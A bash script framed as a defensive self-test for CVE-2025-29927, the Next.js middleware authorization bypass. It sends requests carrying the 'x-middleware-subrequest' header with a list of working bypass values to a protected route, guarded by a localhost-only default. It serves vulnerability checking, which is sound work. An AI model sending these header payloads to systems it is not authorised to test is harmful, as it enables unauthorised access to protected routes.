#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# CVE-2025-29927 — Next.js Middleware Authorization Bypass — SAFE self-test
# ---------------------------------------------------------------------------
# Sends a normal request and then requests carrying the `x-middleware-subrequest`
# header to a PROTECTED route, and compares status codes. If the protected route
# starts returning 200 (instead of 401/307) when the header is present, your
# middleware-based auth is bypassable and you MUST patch (see CVE-2025-29927.md).
#
# AUTHORIZED USE ONLY. By design this targets your OWN local/staging instance.
#   - Default target is http://localhost:3000
#   - Pointing it at any non-localhost host requires you to explicitly set
#     AUTHORIZED_TARGET=yes to assert you own / are authorized to test it.
#   Do NOT run this against systems you do not control. Unauthorized access is
#   illegal in most jurisdictions.
# ---------------------------------------------------------------------------
set -euo pipefail

BASE_URL="${BASE_URL:-http://localhost:3000}"
# A route that should require admin auth (returns 401/302/307 when unauthenticated):
PROTECTED_PATH="${PROTECTED_PATH:-/api/admin/login}"

host="$(printf '%s' "$BASE_URL" | sed -E 's#^[a-z]+://([^/:]+).*#\1#')"
case "$host" in
  localhost|127.0.0.1|0.0.0.0|::1) ;;  # local — always allowed
  *)
    if [ "${AUTHORIZED_TARGET:-no}" != "yes" ]; then
      echo "REFUSING: '$host' is not localhost."
      echo "Set AUTHORIZED_TARGET=yes ONLY if you own/are authorized to test it."
      exit 2
    fi
    echo "WARNING: testing non-local host '$host' under your asserted authorization."
    ;;
esac

url="${BASE_URL%/}${PROTECTED_PATH}"
echo "Target: $url"
echo

code() { curl -s -o /dev/null -w '%{http_code}' --max-time 15 "$@"; }

baseline="$(code "$url")"
echo "baseline (no header)                 -> HTTP $baseline"

# Documented bypass payloads vary by Next.js major version. The header value must
# match the middleware module path; depth padding defeats the recursion guard.
payloads=(
  "middleware"
  "src/middleware"
  "middleware:middleware:middleware:middleware:middleware"
  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
  "pages/_middleware"
)

vuln=0
for p in "${payloads[@]}"; do
  c="$(code -H "x-middleware-subrequest: $p" "$url")"
  printf 'x-middleware-subrequest=%-55s -> HTTP %s\n' "$p" "$c"
  # If a previously-protected route becomes 200, middleware was skipped.
  if [ "$baseline" != "200" ] && [ "$c" = "200" ]; then vuln=1; fi
done

echo
if [ "$vuln" = "1" ]; then
  echo "RESULT: VULNERABLE — the header bypassed middleware (protected route now 200)."
  echo "        Apply the fixes in docs/security/CVE-2025-29927.md immediately."
  exit 1
else
  echo "RESULT: No bypass observed with these payloads (baseline=$baseline)."
  echo "        Still apply defense-in-depth: don't rely on middleware alone for authz."
fi

